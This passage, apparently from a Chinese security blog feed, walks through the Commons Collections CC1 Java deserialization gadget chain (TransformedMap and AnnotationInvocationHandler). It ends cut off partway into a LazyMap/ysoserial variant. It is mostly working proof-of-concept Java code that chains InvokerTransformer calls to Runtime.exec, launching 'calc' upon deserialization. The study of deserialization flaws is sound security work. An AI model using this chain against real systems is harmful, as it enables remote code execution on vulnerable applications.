<p>查找用法，只有<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue</code>可以调用<code>checkSetValue</code>方法（AbstractInputCheckedMapDecorator他是TransformedMap的父类）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>通过遍历MapEntry，调用entry的<code>setValue</code>方法即可调用危险方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        Class runtime = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        exec.invoke(rt,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(rt);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我没有很是理解，借用别的师傅的笔记</p>
<blockquote>
<p>MapEntry中的setValue方法其实就是Entry中的setValue方法，他这里重写了setValue方法。</p>
<p>TransformedMap接受Map对象并且进行转换是需要遍历Map的,遍历出的一个键值对就是Entry，所以当遍历Map时，setValue方法也就执行了。</p>
</blockquote>
<h3 id="PXS5a">调用setValue</h3>
在该`AnnotationInvocationHandler`的`readObject`方法中，存在遍历Map并且调用`setValue`，所以该类可以作为我们的入口类

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>AnnotationInvocationHandler</code>并不是一个puclic类型的类，如果想要调用它的话，需要通过反射的方法来获取其构造函数进行实例化。</p>
<p>观察构造方法，第一个参数要传入一个注解类，第二个参数就要传入我们构造的恶意Map了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable </span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>目前来说，不出意外的话，这个链子已经走完了，但是意外来的很快，我们发现其并没有成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        Class runtime = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        exec.invoke(rt,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        for (Map.Entry entry:transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(rt);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="IHp1B">最后调整</h2>

<p><strong>这条链子没有走下来有几个原因</strong></p>
<h3 id="AGS9S">一）Runtime类没有继承序列化接口</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime</span></span><br></pre></td></tr></table></figure>

<p>没有继承序列化接口就不能被序列化，但是我们可以通过反射来调用，我们先看看普通反射怎么写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">Method</span> getRuntimeMethod = c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>现在我们来把他改成一个InvokerTransformer的形式，但是如此来说就有点繁琐了，需要一直调用transform。</p>
<p>记得有一个ChainedTransformer类，传入一个transform数组，进行递归调用（前一个transform的返回值作为后一个transform的参数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>

<p>这里是ChainedTransformer类的部分源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ChainedTransformer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">ChainedTransformer</span><span class="params">(<span class="keyword">final</span> <span class="type">boolean</span> clone, <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> T, ? extends T&gt;[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = clone ? FunctorUtils.copy(transformers) : transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(T object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> T, ? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; iTransformer : iTransformers) &#123;</span><br><span class="line">            object = iTransformer.transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>根据ChainedTransformer修改后，可成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="r10Sr">二）中间由于存在if判断，并没有进入到if中</h3>
通过动态调试，发现在readObject方法中if判断时，memberType为空，而没有进入到if中

<p>这里的name是get到我们之前Map中put进去键值对的<strong>key</strong>，然后去检查这个注解类中有没有这个<strong>key</strong>名字的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734604811567-b5fdc36b-d58b-4b4f-a1d5-3d4ce8164310.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734604811567-b5fdc36b-d58b-4b4f-a1d5-3d4ce8164310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>因此我们修改一下，在Target注解中存在一个value的参数，在Target注解中存在value名字的参数，只需要把put进去的key改为<strong>value</strong>，将Overide注解的类换为Target注解类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610450476-054512e5-220d-4d72-bcef-f81b7a37dda6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610450476-054512e5-220d-4d72-bcef-f81b7a37dda6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到已经memberType已经不为<strong>NULL</strong>了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610666424-0099b192-4b06-4e57-9f0f-7504adb1210a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734610666424-0099b192-4b06-4e57-9f0f-7504adb1210a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="dhqWm">三）readObject调用的setValue的参数值是固定的</h3>
我们的本意是将setValue中的值改为Runtime.class，但是实际上我们无法修改其中的值，若我们可以控制，这条链就成功走通了

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611334368-9c073e9c-2fb0-48e3-bb5c-3dacd4b478a8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611334368-9c073e9c-2fb0-48e3-bb5c-3dacd4b478a8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>还有一个比较重要的类<code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">，下面为</font><code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">的构造函数和transform方法，构造时传入的参数设为一个常量值，后续调用他的transform方法，无论传入什么值，都会返回这个常量，如果我们在构造时传入 Runtime.class呢</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在只需要在Transformers的首位传入ConstantTransformer类，传入参数为Runtime的类，最后就能成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611778517-78537c43-b8ae-4429-a561-a35934368e1b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611778517-78537c43-b8ae-4429-a561-a35934368e1b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>大概的链子如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734613113591-5088ce99-b9a6-4f9f-b7e7-f9d975d2f339.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734613113591-5088ce99-b9a6-4f9f-b7e7-f9d975d2f339.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC1链补充</title>
    <url>/2025/02/23/CC1%E9%93%BE%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<h1 id="sYR9S">CC1（ysoserial）</h1>
ysoserial中的cc1和我们前面所说后半部分是一样的，这里就不细说

<p>在ysoserial中的cc1是用LazyMap替换了<code>TransformedMap</code></p>
<p>现在使用<code>LazyMap</code>的<code>get</code>方法去触发<code>ChainedTransformer</code>的<code>transform</code>方法</p>
<h2 id="Qwtwt">CC1（ysoserial）攻击链分析</h2>
<h3 id="QXzfE">调用transform方法</h3>
下面为LazyMap的部分代码

<p>我们来看<code>LazyMap</code>的<code>get</code>方法</p>
<p>若map中存在这个key，就返回key，如果没有这个key，才会调用<code>factory</code>的<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 